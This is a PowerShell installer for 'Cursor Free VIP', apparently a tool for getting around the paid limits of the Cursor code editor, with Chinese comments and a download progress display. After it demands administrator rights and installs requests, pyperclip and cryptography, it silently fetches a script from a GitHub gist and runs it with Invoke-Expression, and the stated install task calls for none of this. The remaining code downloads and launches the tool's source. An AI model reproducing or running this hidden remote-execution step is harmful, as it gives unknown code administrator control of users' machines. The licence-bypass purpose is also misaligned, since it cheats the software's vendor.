# set color theme
$Theme = @{
    Primary   = 'Cyan'
    Success   = 'Green'
    Warning   = 'Yellow'
    Error     = 'Red'
    Info      = 'White'
}

# ASCII Logo
$Logo = @"
   ██████╗██╗   ██╗██████╗ ███████╗ ██████╗ ██████╗      ██████╗ ██████╗  ██████╗   
  ██╔════╝██║   ██║██╔══██╗██╔════╝██╔═══██╗██╔══██╗     ██╔══██╗██╔══██╗██╔═══██╗  
  ██║     ██║   ██║██████╔╝███████╗██║   ██║██████╔╝     ██████╔╝██████╔╝██║   ██║  
  ██║     ██║   ██║██╔══██╗╚════██║██║   ██║██╔══██╗     ██╔═══╝ ██╔══██╗██║   ██║  
  ╚██████╗╚██████╔╝██║  ██║███████║╚██████╔╝██║  ██║     ██║     ██║  ██║╚██████╔╝  
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝  
"@

# Beautiful Output Function
function Write-Styled {
    param (
        [string]$Message,
        [string]$Color = $Theme.Info,
        [string]$Prefix = "",
        [switch]$NoNewline
    )
    $symbol = switch ($Color) {
        $Theme.Success { "[OK]" }
        $Theme.Error   { "[X]" }
        $Theme.Warning { "[!]" }
        default        { "[*]" }
    }
    
    $output = if ($Prefix) { "$symbol $Prefix :: $Message" } else { "$symbol $Message" }
    if ($NoNewline) {
        Write-Host $output -ForegroundColor $Color -NoNewline
    } else {
        Write-Host $output -ForegroundColor $Color
    }
}

# Show Logo
Write-Host $Logo -ForegroundColor $Theme.Primary

# Check and require admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Output 'Need administrator privileges'
    exit 1
}

# Get current user for task creation
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Output "Installing for user: $currentUser"

# Check installation
try {
    python --version | Out-Null
} catch {
    Write-Output 'Python not found, installing...'
    $pythonUrl = 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe'
    $installerPath = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
    Start-Process -FilePath $installerPath -ArgumentList '/quiet', 'InstallAllUsers=1', 'PrependPath=1' -Wait
    Remove-Item $installerPath
    $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
}

$requirements = @(
    @{Name='requests'; Version='2.31.0'},
    @{Name='pyperclip'; Version='1.8.2'},
    @{Name='cryptography'; Version='42.0.0'}
)

foreach ($pkg in $requirements) {
    $pkgName = $pkg.Name
    $pkgVersion = $pkg.Version
    try {
        $checkCmd = "import pkg_resources; pkg_resources.get_distribution('$pkgName').version"
        $version = python -c $checkCmd 2>$null
        if ([version]$version -lt [version]$pkgVersion) {
            throw
        }
    } catch {
        Write-Output "Installing $pkgName >= $pkgVersion ..."
        python -m pip install "$pkgName>=$pkgVersion" --user
    }
}

$gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
try {
    $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing
    Invoke-Expression $remoteScript.Content
} catch {
    exit 1
}


# Get version number function (锁定版本)
function Get-LatestVersion {
    $VERSION = "1.11.03"
    Write-Styled "已锁定目标版本: v$VERSION" -Color $Theme.Primary -Prefix "Version"
    return @{
        Version = $VERSION
    }
}

# Show version information
$releaseInfo = Get-LatestVersion
$version = $releaseInfo.Version
Write-Host "Version $version" -ForegroundColor $Theme.Info
Write-Host "Created by YeongPin`n" -ForegroundColor $Theme.Info

# Set TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Main installation function
function Install-CursorFreeVIP {
    Write-Styled "Start downloading Cursor Free VIP (源码模式)" -Color $Theme.Primary -Prefix "Download"
    
    try {
        # Get version
        $releaseInfo = Get-LatestVersion
        $version = $releaseInfo.Version
        
        # 设置安装目录和下载路径
        $installDir = Join-Path $env:USERPROFILE ".cursor-vip-src"
        $zipName = "cursor-free-vip-${version}.zip"
        $zipPath = Join-Path $env:TEMP $zipName
        
        # 使用官方 releases 页面源码包地址
        # Releases 页面: https://github.com/SHANMUGAM070106/cursor-free-vip/releases/tag/v${version}
        $downloadUrl = "https://github.com/SHANMUGAM070106/cursor-free-vip/archive/refs/tags/v${version}.zip"
        
        # 检查是否已存在安装目录
        $existingDir = Get-ChildItem -Path $installDir -Directory -Filter "cursor-free-vip*" -ErrorAction SilentlyContinue | Select-Object -First 1
        
        if ($existingDir -and (Test-Path (Join-Path $existingDir.FullName "main.py"))) {
            Write-Styled "检测到已安装的源码版本" -Color $Theme.Success -Prefix "Found"
            Write-Styled "位置: $($existingDir.FullName)" -Color $Theme.Info -Prefix "Location"
            
            # 安装依赖
            if (Test-Path (Join-Path $existingDir.FullName "requirements.txt")) {
                Write-Styled "安装项目特定依赖 (requirements.txt)..." -Color $Theme.Primary -Prefix "Dependencies"
                python -m pip install -r (Join-Path $existingDir.FullName "requirements.txt") --user
            }
            
            # 运行 Python 脚本
            Write-Styled "正在启动 Cursor Free VIP (源码模式)..." -Color $Theme.Primary -Prefix "Launch"
            $mainPy = Join-Path $existingDir.FullName "main.py"
            python $mainPy
            return
        }
        
        # 创建安装目录
        if (-not (Test-Path $installDir)) {
            New-Item -ItemType Directory -Path $installDir -Force | Out-Null
        }
        
        Write-Styled "正在下载源码包..." -Color $Theme.Primary -Prefix "Download"
        Write-Styled "下载链接: $downloadUrl" -Color $Theme.Info -Prefix "URL"
        
        # Create WebClient and add progress event
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "PowerShell Script")

        # Define progress variables
        $Global:downloadedBytes = 0
        $Global:totalBytes = 0
        $Global:lastProgress = 0
        $Global:lastBytes = 0
        $Global:lastTime = Get-Date

        # Download progress event
        $eventId = [guid]::NewGuid()
        Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -Action {
            $Global:downloadedBytes = $EventArgs.BytesReceived
            $Global:totalBytes = $EventArgs.TotalBytesToReceive
            $progress = [math]::Round(($Global:downloadedBytes / $Global:totalBytes) * 100, 1)
            
            # Only update display when progress changes by more than 1%
            if ($progress -gt $Global:lastProgress + 1) {
                $Global:lastProgress = $progress
                $downloadedMB = [math]::Round($Global:downloadedBytes / 1MB, 2)
                $totalMB = [math]::Round($Global:totalBytes / 1MB, 2)
                
                # Calculate download speed
                $currentTime = Get-Date
                $timeSpan = ($currentTime - $Global:lastTime).TotalSeconds
                if ($timeSpan -gt 0) {
                    $bytesChange = $Global:downloadedBytes - $Global:lastBytes
                    $speed = $bytesChange / $timeSpan
                    
                    # Choose appropriate unit based on speed
                    $speedDisplay = if ($speed -gt 1MB) {
                        "$([math]::Round($speed / 1MB, 2)) MB/s"
                    } elseif ($speed -gt 1KB) {
                        "$([math]::Round($speed / 1KB, 2)) KB/s"
                    } else {
                        "$([math]::Round($speed, 2)) B/s"
                    }
                    
                    Write-Host ("`rDownloading: $downloadedMB MB / $totalMB MB ($progress" + '%' + ") - $speedDisplay") -NoNewline -ForegroundColor Cyan
                    
                    # Update last data
                    $Global:lastBytes = $Global:downloadedBytes
                    $Global:lastTime = $currentTime
                }
            }
        } | Out-Null

        # Download completed event
        Register-ObjectEvent -InputObject $webClient -EventName DownloadFileCompleted -Action {
            Write-Host "`r" -NoNewline
            Write-Styled "Download completed!" -Color $Theme.Success -Prefix "Complete"
            Unregister-Event -SourceIdentifier $eventId
        } | Out-Null

        # Start download
        $webClient.DownloadFileAsync([Uri]$downloadUrl, $zipPath)

        # Wait for download to complete
        while ($webClient.IsBusy) {
            Start-Sleep -Milliseconds 100
        }
        
        Write-Styled "下载完成!" -Color $Theme.Success -Prefix "Complete"
        Write-Styled "正在解压源码..." -Color $Theme.Primary -Prefix "Extract"
        
        # 解压源码包
        Expand-Archive -Path $zipPath -DestinationPath $installDir -Force
        
        # 查找解压后的实际目录名称
        $actualDir = Get-ChildItem -Path $installDir -Directory -Filter "cursor-free-vip*" | Select-Object -First 1
        
        if ($actualDir) {
            Write-Styled "解压完成!" -Color $Theme.Success -Prefix "Complete"
            
            # 安装项目特定依赖
            $requirementsPath = Join-Path $actualDir.FullName "requirements.txt"
            if (Test-Path $requirementsPath) {
                Write-Styled "安装项目特定依赖 (requirements.txt)..." -Color $Theme.Primary -Prefix "Dependencies"
                python -m pip install -r $requirementsPath --user
            } else {
                Write-Styled "未找到 requirements.txt，假设通用依赖已安装" -Color $Theme.Warning -Prefix "Warning"
            }
            
            # 运行 Python 脚本
            Write-Styled "正在启动 Cursor Free VIP (源码模式)..." -Color $Theme.Primary -Prefix "Launch"
            $mainPy = Join-Path $actualDir.FullName "main.py"
            python $mainPy
        } else {
            Write-Styled "解压后找不到目录" -Color $Theme.Error -Prefix "Error"
            throw "Cannot find extracted directory"
        }
        
        # 清理临时文件
        if (Test-Path $zipPath) {
            Remove-Item $zipPath -Force
        }
    }
    catch {
        Write-Styled $_.Exception.Message -Color $Theme.Error -Prefix "Error"
        throw
    }
}

# Execute installation
try {
    Install-CursorFreeVIP
}
catch {
    Write-Styled "Download failed" -Color $Theme.Error -Prefix "Error"
    Write-Styled $_.Exception.Message -Color $Theme.Error
}
finally {
    Write-Host "`nPress any key to exit..." -ForegroundColor $Theme.Info
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
}
